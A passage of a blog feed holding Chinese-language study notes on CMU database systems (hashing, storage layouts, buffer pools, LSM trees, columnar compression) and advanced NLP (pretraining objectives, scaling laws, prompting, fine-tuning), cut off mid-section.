将其条目重新分配到旧桶和新桶之间。</p><p><strong>查找规则</strong>：计算 <code>hash1(key)</code>。如果结果&lt; 拆分指针，则该桶已被拆分，因此使用<code>hash2(key)</code>。如果结果 ≥ 拆分指针，则 <code>hash1</code>是正确的。</p><p><strong>轮次完成</strong>：当拆分指针到达末尾时，所有桶都已拆分。丢弃<code>hash1</code>，将 <code>hash2</code> 提升为新的<code>hash1</code>，创建 <code>hash2 = key % 4n</code>，将指针重置为0。任何时候最多只有两个哈希函数共存。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207145824285.png" alt="image-20260207145824285" style="zoom:40%;" /></p>]]></content>
      
      
      <categories>
          
          <category> CMU 15-645 数据库系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> Database Systems </tag>
            
            <tag> 15645 </tag>
            
            <tag> Hash Tables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15645 Database systems: Storage</title>
      <link href="/zh/2026/01/31/15645-Database-Systems/15645-Database-systems-Storage/"/>
      <url>/zh/2026/01/31/15645-Database-Systems/15645-Database-systems-Storage/</url>
      
        <content type="html"><![CDATA[<h1 id="lec3-数据库存储文件与页面">Lec3 数据库存储：文件与页面</h1><h2 id="存储层次">存储层次</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201113518099.png" alt="image-20260201113518099" style="zoom:100%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201113835345.png" alt="image-20260201113835345" style="zoom:100%;" /></p><h2 id="堆文件">堆文件</h2><p>堆文件是一个无序的页面集合，元组以随机顺序存储。</p><p>需要额外的元数据来跟踪文件的位置和空闲空间的可用性。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201130006343.png" alt="image-20260201130006343" style="zoom:50%;" /></p><h2 id="页面布局">页面布局</h2><h3 id="页面头部">页面头部</h3><p>每个页面包含关于页面内容的元数据头部。</p><p>页面大小；校验和；DBMS版本；事务可见性；压缩/编码元数据；模式信息；数据摘要/草图</p><p>方法：</p><ul><li><p><strong>方法 #1：元组导向存储</strong></p></li><li><p><strong>方法 #2：日志结构存储</strong></p></li><li><p><strong>方法 #3：索引组织存储</strong></p></li></ul><h3 id="元组导向存储">元组导向存储</h3><p>最常见的布局方案称为插槽页面。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201150241807.png" alt="image-20260201150241807" style="zoom:50%;" /></p><h3 id="记录id">记录ID</h3><p>DBMS为每个逻辑元组分配一个唯一的<strong>记录标识符</strong>，表示其在数据库中的物理位置。</p><p>→ 示例：文件ID，页面ID，插槽#</p><h2 id="元组布局">元组布局</h2><p>元组本质上是一个字节序列，前面带有一个包含其元数据的<strong>头部</strong>。</p><h3 id="元组头部">元组头部</h3><p>每个元组前面都有一个包含其元数据的头部。</p><p>→ 可见性信息（并发控制）</p><p>→ <strong>NULL</strong>值的位图。</p><p>我们不需要存储关于模式的元数据。</p><h3 id="元组数据">元组数据</h3><p>属性通常按照创建表时指定的顺序存储。然而，以不同的方式布局可能更<strong>高效</strong>。</p><h1 id="lec4-缓冲池内存管理">Lec4 缓冲池内存管理</h1><p>本讲将解决DBMS如何管理其内存以及如何在磁盘之间来回移动数据。</p><h2 id="磁盘导向dbms模型">磁盘导向DBMS模型</h2><p>现代DBMS是<strong>磁盘导向</strong>的：磁盘是真相的来源，而内存用于性能优化。</p><p>数据移动受两个维度的控制：</p><ul><li><strong>空间控制</strong>：页面在磁盘上的放置位置，旨在保持频繁共同访问的页面物理上接近。</li><li><strong>时间控制</strong>：页面何时被引入内存，以及何时修改的页面被写回磁盘。</li></ul><p>缓冲池是实现时间控制的核心机制。</p><h2 id="缓冲池元数据">缓冲池元数据</h2><p>为了管理缓存页面，DBMS在内存中维护元数据：</p><h3 id="页面表">页面表</h3><ul><li>映射 <code>page_id → frame_id</code></li><li>通常实现为哈希表</li><li>由锁保护以确保线程安全</li><li>不持久化到磁盘</li></ul><h3 id="每页元数据">每页元数据</h3><p>每个缓存页面跟踪：</p><ul><li><strong>脏标志</strong>：页面是否已被修改</li><li><strong>固定（引用）计数</strong>：活跃用户的数量；固定页面不能被驱逐</li><li><strong>访问历史</strong>：由替换策略使用</li></ul><h2 id="锁与锁存器">锁与锁存器</h2><p>缓冲池使用<strong>锁存器</strong>，而不是锁。</p><ul><li><strong>锁</strong>保护逻辑数据库内容，并在事务持续期间持有</li><li><strong>锁存器</strong>保护内部DBMS数据结构，并短暂持有</li></ul><p>锁存器不需要回滚支持，更接近于互斥锁。</p><h2 id="页面目录与页面表">页面目录与页面表</h2><p>这两个结构常常被混淆：</p><ul><li><strong>页面目录</strong>：将页面映射到磁盘位置，持久化到磁盘</li><li><strong>页面表</strong>：将页面映射到内存帧，仅存在于内存中</li></ul><p>目录在重启后支持恢复；页面表则不支持。</p><h2 id="缓冲替换策略">缓冲替换策略</h2><p>当缓冲池满时，必须加载新页面，DBMS必须驱逐现有页面。替换策略旨在平衡正确性、准确性和低开销。</p><h3 id="lru与时钟">LRU与时钟</h3><ul><li>驱逐最近最少访问的页面</li><li>时钟使用引用位近似LRU</li></ul><p>两者都容易受到<strong>顺序洪水</strong>的影响，即大规模扫描驱逐即将被重用的有用页面。</p><h3 id="lru-k">LRU-K</h3><p>LRU-K考虑<strong>第K次最近访问</strong>，而不仅仅是最后一次。</p><ul><li>访问次数少于K的页面被视为低价值</li><li>有助于区分一次性扫描和真正热门的页面</li><li>需要更多元数据和更高的实现复杂性</li></ul><h3 id="arc">ARC</h3><p>自适应替换缓存动态平衡新近性和频率。</p><ul><li>为最近和频繁的页面维护单独的列表</li><li>使用幽灵列表从最近的驱逐中学习</li><li>根据工作负载自动调整行为</li></ul><p>ARC更复杂，但对混合工作负载适应良好。</p><h1 id="lec5-日志结构存储">Lec5 日志结构存储</h1><p>传统的页面导向存储假设数据可以就地覆盖。然而，这一假设在现代存储系统中失效，因为随机写入成本高昂或根本不支持。</p><p>日志结构存储采取不同的方法：<strong><u>DBMS将所有更改记录为日志记录，而不是修改页面内的元组。</u></strong></p><h2 id="日志记录与内存更新">日志记录与内存更新</h2><p>对元组的每次修改都表示为日志记录：</p><ul><li><strong>PUT(key, value)</strong> 插入或更新一个元组</li><li><strong>DELETE(key)</strong> 将元组标记为已删除</li></ul><p>DBMS不会立即将这些记录写入磁盘。相反，更新首先应用于一个称为<strong>MemTable</strong>的内存数据结构。</p><p>MemTable保持键的排序，并始终反映数据库的最新状态。</p><h2 id="将memtable刷新到磁盘">将MemTable刷新到磁盘</h2><p>当MemTable变满时，DBMS将其内容刷新到磁盘作为<strong>排序字符串表（SSTable）</strong>。</p><p>SSTable的关键属性：</p><ul><li>作为新文件存储在磁盘上</li><li>包含按键排序的记录（低→高）</li><li>一旦写入即不可变</li></ul><p>这个刷新后的SSTable被放入<strong>级别0</strong>。</p><p>在此阶段，可能存在多个SSTable，按<strong>最新到最旧</strong>排序，并且它们的键范围可能重叠。</p><h2 id="多级组织">多级组织</h2><p>随着生成更多SSTable，DBMS将它们组织成多个级别：</p><ul><li><strong>级别0</strong><ul><li>直接从内存刷新到的SSTable</li><li>键范围可能重叠</li><li>按创建时间排序（最新→最旧）</li></ul></li><li><strong>较低级别（级别1，级别2，…）</strong><ul><li>SSTable具有不重叠的键范围</li><li>数据逐渐变得更旧且更紧凑</li></ul></li></ul><p>这种层次结构允许DBMS在顶部快速吸收写入，同时在后台逐渐组织数据。</p><h2 id="读取数据get">读取数据（GET）</h2><p>为了处理<code>GET(key)</code>请求，DBMS搜索键的最新版本：</p><ol type="1"><li><strong>MemTable</strong><ul><li>首先检查，因为它包含最新的更新</li></ul></li><li><strong>SummaryTable</strong><ul><li>存储元数据，例如：<ul><li>每个SSTable的最小/最大键</li><li>每个级别的键过滤器</li></ul></li><li>用于消除无法包含该键的SSTable</li></ul></li><li><strong>磁盘级别</strong><ul><li>从最新到最旧的SSTable搜索级别0</li><li>使用键范围约束搜索较低级别</li></ul></li></ol><p>一旦找到键，搜索就停止。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201200533436.png" alt="image-20260201200533436" style="zoom:50%;" /></p><h2 id="日志结构压缩">日志结构压缩</h2><p>随着时间的推移，SSTable会累积过时的版本和已删除的条目。为了回收空间并提高读取性能，DBMS定期执行<strong>压缩</strong>。</p><p>压缩：</p><ul><li>使用排序合并算法合并多个SSTable</li><li>仅保留每个键的最新版本</li><li>丢弃过时的条目和墓碑</li></ul><p>这个过程在较低级别生成新的SSTable，同时删除旧的。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201200458754.png" alt="image-20260201200458754" style="zoom: 50%;" /></p><h2 id="压缩策略">压缩策略</h2><p>PPT介绍了两种压缩策略：</p><ul><li><strong>分级压缩</strong><ul><li>将数据组织成多个级别</li><li>同一级别内的SSTable不重叠（级别0除外）</li><li>针对读取密集型工作负载进行了优化</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201200418845.png" alt="image-20260201200418845" style="zoom:50%;" /></p><ul><li><strong>通用压缩</strong><ul><li>维护单个逻辑级别</li><li>允许重叠的键范围</li><li>针对写入密集型工作负载进行了优化</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260201200354967.png" alt="image-20260201200354967" style="zoom: 50%;" /></p><h1 id="lec6-数据库存储-列存储-数据压缩">Lec6 数据库存储 + 列存储 +数据压缩</h1><h2 id="数据库工作负载">数据库工作负载</h2><ul><li>在线事务处理（OLTP）：快速操作，仅读取/更新少量数据</li><li>在线分析处理（OLAP）：复杂查询，读取大量数据以计算聚合</li><li>混合事务 + 分析处理：OLTP + OLAP</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202140700003.png" alt="image-20260202140700003" style="zoom:40%;" /></p><h2 id="存储模型">存储模型</h2><p>DBMS的<strong>存储模型</strong>指定其在磁盘和内存中如何物理组织元组。</p><blockquote><p>根据目标工作负载可能具有不同的性能特征，并影响DBMS其余部分的设计选择</p></blockquote><ul><li>N元存储模型（NSM）</li><li>分解存储模型（DSM）</li><li>混合存储模型（PAX）</li></ul><h3 id="nsm">NSM</h3><p>磁盘导向的NSM系统将元组的固定长度和可变长度属性连续存储在单个插槽页面中。</p><blockquote><p>元组的<strong>记录ID</strong>（页面#，插槽#）是DBMS唯一标识物理元组的方式</p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202141836961.png" alt="image-20260202141836961" style="zoom:40%;" /></p><p><strong>优点</strong></p><ul><li>快速插入、更新和删除。</li><li>适合需要整个元组的查询（OLTP）。</li><li>可以使用面向索引的物理存储进行聚类。</li></ul><p><strong>缺点</strong></p><ul><li><p>不适合扫描表的大部分和/或属性的子集。</p></li><li><p>访问模式中的内存局部性差。</p></li><li><p>由于单个页面内存在多个值域，不适合压缩。</p></li></ul><h3 id="dsm">DSM</h3><p>为所有元组连续存储单个属性的数据块。<u>也称为“列存储”</u></p><blockquote><p>理想用于OLAP工作负载，其中只读查询对表的属性子集执行大规模扫描。</p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202142652635.png" alt="image-20260202142652635" style="zoom:50%;" /></p><p><strong>元组识别</strong></p><ul><li>固定长度偏移</li><li>嵌入元组ID</li></ul><p><strong>优点</strong></p><ul><li><p>减少每个查询浪费的I/O量，因为DBMS仅读取所需的数据。</p></li><li><p>由于局部性增加和缓存数据重用，查询处理速度更快（<strong>第14讲</strong>）。</p></li><li><p>更好的数据压缩，因为来自同一域的数据物理上聚集在一起。</p></li></ul><p><strong>缺点</strong></p><ul><li>由于元组拆分/拼接/重组，点查询、插入、更新和删除速度较慢。</li></ul><h3 id="pax">PAX</h3><p><strong>属性跨分区</strong>（PAX）是一种混合存储模型，在数据库页面内垂直分区属性。</p><p>将数据水平分区为<strong>行组</strong>。然后将它们的属性垂直分区为<strong><em>列块</em></strong>。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202143955864.png" alt="image-20260202143955864" style="zoom:40%;" /></p><h2 id="数据库压缩">数据库压缩</h2><p><strong>目标：</strong></p><ul><li><p><strong>#1：</strong>必须生成固定长度的值。唯一的例外是存储在单独池中的可变长度数据。</p></li><li><p><strong>#2：</strong>在查询执行期间尽可能推迟解压缩。这也称为<strong>延迟物化</strong>。</p></li><li><p><strong>#3：</strong>必须是无损方案。人们（通常）不喜欢丢失数据。<strong>任何有损压缩必须由应用程序执行</strong></p></li></ul><h3 id="压缩粒度">压缩粒度</h3><ul><li><strong>块级</strong>：压缩同一表的元组块。</li><li><strong>元组级</strong>：压缩整个元组的内容（仅限NSM）。</li><li><strong>属性级</strong>：压缩一个元组内的单个属性（溢出）。可以针对同一元组的多个属性。</li><li><strong>列级</strong>：压缩为多个元组存储的一个或多个属性的多个值（仅限DSM）。</li></ul><h3 id="天真压缩">天真压缩</h3><p>使用通用算法压缩数据。压缩范围基于提供的输入。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202144852164.png" alt="image-20260202144852164" style="zoom:40%;" /></p><blockquote><p>理想情况下，DBMS可以在&lt;u&gt;不先解压缩</u>的情况下对压缩数据进行操作。</p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202145041605.png" alt="image-20260202145041605" style="zoom:40%;" /></p><h3 id="列式压缩">列式压缩</h3><p><strong>游程编码</strong></p><p>将单列中相同值的运行压缩为三元组：</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202145403355.png" alt="image-20260202145403355" style="zoom:30%;" /></p><hr /><p><strong>位打包编码</strong></p><p>如果整数属性的值小于其给定数据类型大小的范围，则减少表示每个值所需的位数。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202145546669.png" alt="image-20260202145546669" style="zoom:40%;" /></p><blockquote><p><strong>补丁/大多数编码</strong>：一种位打包的变体，当属性的值“主要”小于最大大小时，用较小的数据类型存储它们。</p></blockquote><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202145840090.png" alt="image-20260202145840090" style="zoom:40%;" /></p><hr /><p><strong>位图编码</strong></p><p>为每个属性的唯一值存储一个单独的位图，其中向量中的偏移量对应于一个元组。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202150128385.png" alt="image-20260202150128385" style="zoom:35%;" /></p><p>但这种方法存在一些缺陷。</p><p>假设我们有1000万个元组。美国有43,000个邮政编码。</p><p>→ <strong>10000000</strong> <strong>×</strong> <strong>32位 = 40MB</strong>（原始）</p><p>→ <strong>10000000</strong> <strong>×</strong> <strong>43000 = 53.75GB</strong>（使用位图）</p><p>每次应用程序插入新元组时，DBMS必须扩展43,000个不同的位图。</p><hr /><p><strong>Roaring位图</strong></p><p>位图索引根据位的局部密度切换使用哪种数据结构来处理一系列值</p><ul><li>密集块使用未压缩的位图存储。（可以进一步使用RLE压缩）</li><li>稀疏块使用16位整数的位打包数组。</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202151924937.png" alt="image-20260202151924937" style="zoom:35%;" /></p><hr /><p><strong>增量/参考帧编码</strong></p><p>记录同一列中相邻值之间的差异。</p><blockquote><p>结合RLE可以获得更好的压缩比。</p></blockquote><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202150652776.png"alt="image-20260202150652776" /><figcaption aria-hidden="true">image-20260202150652776</figcaption></figure><hr /><p><strong>字典编码</strong></p><p>用较小的固定长度代码替换频繁的值，然后维护从代码到原始值的映射（字典）。(<strong>通常，每个属性值一个代码</strong>。）</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202151150956.png" alt="image-20260202151150956" style="zoom:35%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202151303156.png" alt="image-20260202151303156" style="zoom:35%;" /></p><h2 id="分叉环境">分叉环境</h2><p>分叉环境将OLTP和OLAP系统分开，通过ETL或ELT管道在它们之间移动数据。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202155219551.png" alt="image-20260202155219551" style="zoom:30%;" /></p><h2 id="混合存储模型">混合存储模型</h2><p>使用分别针对NSM或DSM数据库优化的执行引擎。</p><ul><li>在NSM中存储新数据以实现快速OLTP。</li><li>将数据迁移到DSM以实现更高效的OLAP。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260202155745470.png"alt="image-20260202155745470" /><figcaption aria-hidden="true">image-20260202155745470</figcaption></figure><h3 id="破碎镜像"><strong>破碎镜像</strong></h3><p>示例：Oracle，IBM DB2 Blu，Microsoft SQL Server</p><p>DBMS自动维护数据库的第二份副本，采用DSM布局。</p><ul><li>所有更新首先输入NSM，然后最终复制到DSM镜像中。</li><li>如果DBMS支持更新，则必须使DSM镜像中的元组失效。</li></ul><h3 id="增量存储"><strong>增量存储</strong></h3><p>示例：SAP HANA，Vertica，SingleStore，Databricks，Google Napa</p><p>后台线程将增量存储中的更新迁移并应用于DSM数据。</p><ul><li>批量处理大块数据，然后将其写出为PAX文件。</li><li>一旦它们进入列存储，就在增量存储中删除记录。</li></ul><blockquote><p>增量存储是一个面向行的写缓冲区，吸收更新，并定期批量合并到列存储中。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CMU 15-645 数据库系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> Database Systems </tag>
            
            <tag> 15645 </tag>
            
            <tag> Storage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11711 Advanced NLP: Learning &amp; Inference</title>
      <link href="/zh/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/"/>
      <url>/zh/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/</url>
      
        <content type="html"><![CDATA[<h1 id="lec6-预训练">Lec6 预训练</h1><h2 id="基本思想">基本思想</h2><p>预训练的基础模型将适应下游任务。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130130847510.png" alt="image-20260130130847510" style="zoom: 33%;" /></p><p>迁移学习：从一个任务中获取“知识”并应用于另一个任务</p><p><strong>•</strong><strong>更少的任务数据</strong>：使用更少的数据达到给定的性能水平</p><p><strong>•</strong><strong>更好的任务性能</strong>：达到比从头开始训练更高的性能</p><p><strong>•</strong><strong>一个模型，多种任务</strong>：方便，摊薄成本，许多用途的起点，…</p><h2 id="主要因素">主要因素</h2><p>每个模型受以下四个主要因素的影响：</p><p><strong>•</strong> <strong>架构：</strong> 神经网络架构</p><p><strong>•</strong> <strong>任务：</strong>模型预测的内容（例如，下一个标记）</p><p><strong>•</strong> <strong>数据：</strong> 用于训练模型的数据</p><p><strong>•</strong><strong>超参数</strong>：例如，学习率，批量大小</p><h2 id="掩码语言建模">掩码语言建模</h2><p>掩码语言建模（MLM）训练语言模型以<strong>根据剩余可见上下文预测掩码标记</strong>。这个目标在双向模型（如BERT）中被广泛使用。</p><p>MLM损失定义为：</p><p><span class="math display">\[\mathcal{L}_{\text{MLM}}(\theta; D)=-\frac{1}{|D|}\sum_{x \in D}\;\mathbb{E}_{M \sim \text{corrupt}(x)}\sum_{t \in M}\log p_\theta(x_t \mid x_{-M})\]</span></p><ul><li><p><span class="math inline">\(x \inD\)</span>：来自数据集的输入序列（句子）<br /></p></li><li><p><spanclass="math inline">\(M\)</span>：随机抽样的掩码标记位置集合<br /></p></li><li><p><spanclass="math inline">\(\text{corrupt}(x)\)</span>：应用于<spanclass="math inline">\(x\)</span>的掩码（损坏）过程<br /></p></li><li><p><spanclass="math inline">\(x_{-M}\)</span>：序列中所有未掩码的标记<br /></p></li><li><p><span class="math inline">\(x_t\)</span>：位置<spanclass="math inline">\(t\)</span>的真实标记<br /></p></li><li><p><span class="math inline">\(p_\theta(x_t \midx_{-M})\)</span>：给定可见上下文预测<spanclass="math inline">\(x_t\)</span>的模型概率</p></li><li><p><strong>去噪视角</strong>：MLM可以被视为去噪自编码器：输入通过掩码标记被损坏，模型学习重建原始序列。</p></li><li><p><strong>伪似然目标</strong>：MLM最大化给定序列其余部分的掩码标记的条件对数概率之和，而不是建模序列的完整联合似然。这对应于最大化<em>伪似然</em>而不是真实的联合似然。</p></li></ul><h2 id="自回归语言建模">自回归语言建模</h2><p>给定所有先前的标记<spanclass="math inline">\(x_{&lt;t}\)</span>预测下一个标记<spanclass="math inline">\(x_t\)</span>。 [ <em>{}(; D) = - </em>{x D}<em>{t=1}^{|x|} p</em>(x_t x_{&lt;t}) ] <strong>关键特性</strong> -最大化训练数据的似然<br />- 拟合真实数据分布<span class="math inline">\(p_*\)</span><br />- 等价于具有单热目标分布的交叉熵<br />- 可以解释为学习<strong>压缩</strong>由<spanclass="math inline">\(p_*\)</span>生成的数据</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130140511145.png" alt="image-20260130140511145" style="zoom:40%;" /></p><h2 id="评估模型">评估模型</h2><ul><li>损失（训练、验证、测试）<ul><li>诊断训练轨迹，比较同一家族的模型</li></ul></li><li>少量提示</li><li>微调</li></ul><h2 id="数据">数据</h2><ul><li><strong>数量</strong>：我有多少数据？</li><li><strong>质量</strong>：对训练是否有益？（提取、过滤、去重）</li><li><strong>覆盖率</strong>：数据是否覆盖我关心的领域，并且比例正确？<ul><li>我们可以训练一个分类器过滤，以帮助我们检测内容</li></ul></li></ul><h1 id="lec7-规模法则与上下文学习">Lec7 规模法则与上下文学习</h1><h2 id="规模法则">规模法则</h2><h3 id="训练-花费计算">训练 = 花费计算</h3><p>在固定的预训练预算下，我们应该如何分配预算以实现最佳模型？</p><p><img src="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20260206232739205.png" alt="image-20260206232739205" style="zoom:33%;" /></p><p>变压器LM的核心近似（Kaplan et al. 2020）： <spanclass="math display">\[C \approx 6ND\]</span></p><ul><li><strong>N</strong> = 参数数量，<strong>D</strong> =标记数量，<strong>C</strong> = FLOPs</li><li>示例：Llama 2 7B在2T标记上 → C ≈ 8.4 × 10²² FLOPs</li></ul><p><strong>核心问题</strong>：在固定的C下，如何在N和D之间进行拆分？</p><h3 id="幂律">幂律</h3><p><span class="math display">\[L = a \cdot x^{b} \quad \Rightarrow \quad \log L = \log a + b \cdot \logx\]</span></p><p>将x加倍 → L变为L · 2ᵇ。当b =−0.095时，加倍数据仅减少损失约6.4%。<strong>收益递减非常严重</strong>——线性损失改善需要指数级更多资源。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206233531669.png" alt="image-20260206233531669" style="zoom:40%;" /></p><h3 id="数据规模">数据规模</h3><p><span class="math display">\[L = (D / D_c)^{-b}\]</span></p><ul><li>三个区域：小数据 → <strong>幂律区域</strong> →不可减少的误差（受数据熵限制）</li><li>重复数据：<sub>4个周期≈新数据；</sub>40个周期→毫无价值（Muennighoff+2025）</li><li>不同领域（维基百科、书籍、公共抓取）具有不同的规模曲线</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206233726326.png" alt="image-20260206233726326" style="zoom:40%;" /></p><h3 id="模型大小规模">模型大小规模</h3><p><span class="math display">\[L = (N / N_c)^{-b}\]</span></p><ul><li>更大的模型更<strong>样本高效</strong>（用更少的标记达到更低的损失）</li><li>变压器的扩展性显著优于LSTM</li></ul><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206233840078.png"alt="image-20260206233840078" /><figcaption aria-hidden="true">image-20260206233840078</figcaption></figure><h3 id="计算最优训练">计算最优训练</h3><table><colgroup><col style="width: 49%" /><col style="width: 9%" /><col style="width: 9%" /><col style="width: 32%" /></colgroup><thead><tr class="header"><th>论文</th><th>N_opt</th><th>D_opt</th><th>含义</th></tr></thead><tbody><tr class="odd"><td>Kaplan et al. 2020</td><td>∝ C⁰·⁷³</td><td>∝ C⁰·²⁷</td><td>优先考虑更大的模型</td></tr><tr class="even"><td><strong>Chinchilla</strong> (Hoffmann et al. 2022)</td><td>∝ C⁰·⁵</td><td>∝ C⁰·⁵</td><td><strong>N和D同等扩展</strong></td></tr></tbody></table><p><strong><u>∝表示成比例</u></strong></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206234520100.png" alt="image-20260206234520100" style="zoom:40%;" /></p><p>Chinchilla的洞察：许多现有的LLM（例如，Gopher280B）被<strong>训练不足</strong>。这直接影响了LLaMA的设计——较小的模型在更多数据上进行训练。</p><blockquote><p>进行小规模实验 → 适应规模法则 →推断目标运行的最佳超参数（模型大小、标记、批量大小、学习率）。</p></blockquote><h2 id="提示与上下文学习">提示与上下文学习</h2><h3 id="三种提示策略">三种提示策略</h3><table><colgroup><col style="width: 15%" /><col style="width: 34%" /><col style="width: 50%" /></colgroup><thead><tr class="header"><th>策略</th><th>格式</th><th>关键问题</th></tr></thead><tbody><tr class="odd"><td>无提示</td><td>原始文本补全</td><td>不可控</td></tr><tr class="even"><td>零-shot</td><td>指令 + 输入</td><td>输出格式不稳定；对措辞敏感</td></tr><tr class="odd"><td>少量-shot (ICL)</td><td>指令 + K个示例 + 输入</td><td>示例定义格式和任务；无参数更新</td></tr></tbody></table><h3 id="icl现象agarwal-et-al.-2024">ICL现象（Agarwal et al. 2024）</h3><ul><li><strong>任务检索</strong>：有时仅输入示例的效果与（输入，输出）对一样好——ICL部分“检索”预训练模式而不是学习新的映射</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206235526522.png" alt="image-20260206235526522" style="zoom:40%;" /></p><ul><li><p><strong>预训练偏差</strong>：默认标签需要少量示例；翻转/抽象标签需要更多示例以克服内置关联</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206235557572.png" alt="image-20260206235557572" style="zoom:30%;" /></p></li><li><p><strong>敏感性</strong>：示例顺序、标签平衡和标签覆盖率都会显著影响性能（Luet al. 2021；Zhang et al. 2022）</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206235916474.png" alt="image-20260206235916474" style="zoom:30%;" /></p></li><li><p><strong>模型变异</strong>：从多次示例中受益的能力差异很大（Gemini1.5 Pro在1024-shot时提升；GPT-4-Turbo早期达到饱和）</p></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260206235954906.png" alt="image-20260206235954906" style="zoom:33%;" /></p><h3 id="聊天提示">聊天提示</h3><p>消息格式为<strong>系统</strong> / <strong>用户</strong> /<strong>助手</strong>角色 →分词器将其转换为带有特殊标记的字符串。系统提示定义模型行为（推理策略、安全规则、输出格式等）。</p><h3 id="思维链cot">思维链（CoT）</h3><ul><li><strong>少量-shot CoT</strong>（Wei etal. 2022）：在示例中包含推理步骤</li><li><strong>零-shot CoT</strong>（Kojima etal. 2022）：附加“让我们一步一步思考”</li><li>关键洞察：CoT为模型提供<strong>自适应计算时间</strong>——每个推理标记是额外的前向传递</li></ul><h3 id="提示链">提示链</h3><p>顺序链多个LLM调用（使用不同的提示/外部工具）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入 → LLM₁ → 中间结果 → LLM₂ → 中间结果 → ... → 输出</span><br></pre></td></tr></table></figure><p>实现问题分解、工具使用（搜索、代码执行）和多步骤推理。</p><hr /><h1 id="lec8-微调">Lec8 微调</h1><h3 id="什么是微调">什么是微调？</h3><p>在任务特定数据上继续基于梯度的训练预训练模型。给定预训练参数θ₀和数据集D= {(x, y)ₙ}： <span class="math display">\[\theta^* = \arg\min_\theta \mathbb{E}_{(x,y)\sim D}[\mathcal{L}(f_\theta(x), y)]\]</span>也称为<strong>监督微调（SFT）</strong>。使用正则化/丢弃以防止过拟合。</p><h3 id="两种微调范式">两种微调范式</h3><p><strong>分类微调</strong>：在最后的隐藏状态上添加线性头。 <spanclass="math display">\[p_\theta(y \mid x) = \text{softmax}(Wh + b), \quad W \in \mathbb{R}^{K\times d}, \; b \in \mathbb{R}^K\]</span></p><ul><li>损失：交叉熵 <span class="math inline">\(\mathcal{L} = -\logp_\theta(y \mid x)\)</span></li><li>更新所有参数 <span class="math inline">\(\theta = (\theta_0, W,b)\)</span></li></ul><p><strong>语言模型微调</strong>：保持LM架构，在（输入，输出）对上训练。</p><p>保持LM架构，在（输入，输出）对上训练。连接为<code>[start] x [sep] y [end]</code>，仅对输出标记计算损失：</p><p><span class="math display">\[\mathcal{L}_{\text{MLE}} = -\sum_{t=1}^{T} \log p_\theta(y_t \mid x,y_{&lt;t})\]</span> 不需要额外的头——使用现有的LM头。</p><h3 id="更新哪些参数">更新哪些参数？</h3><table><colgroup><col style="width: 13%" /><col style="width: 24%" /><col style="width: 7%" /><col style="width: 53%" /></colgroup><thead><tr class="header"><th>选项</th><th>更新内容</th><th>成本</th><th>权衡</th></tr></thead><tbody><tr class="odd"><td>仅头部</td><td><span class="math inline">\(K \times d + K\)</span>参数</td><td>最便宜</td><td>假设预训练表示已经是线性可分的</td></tr><tr class="even"><td>完全微调</td><td>所有</td><td><span class="math inline">\(\theta\)</span></td><td>可能导致过拟合</td></tr><tr class="odd"><td><strong>PEFT</strong></td><td>小子集</td><td><span class="math inline">\(\theta\)</span></td><td>可以改变表示</td></tr></tbody></table><h3 id="lora低秩适应hu-et-al.-2021">LoRA（低秩适应）[Hu etal. 